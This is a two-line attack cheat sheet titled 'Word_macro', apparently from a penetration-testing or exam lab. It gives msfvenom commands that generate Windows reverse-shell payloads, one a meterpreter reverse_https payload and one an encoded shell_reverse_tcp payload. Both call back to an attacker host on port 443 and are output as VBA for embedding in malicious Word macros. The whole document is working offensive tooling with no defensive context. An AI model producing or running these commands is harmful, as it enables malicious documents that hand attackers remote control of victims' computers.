# Word_macro
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.153 LPORT=443 EXITFUNC=thread -f vbapplication
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.153 LPORT=443 -e x64/shikata_ga_nai -f vbapplication
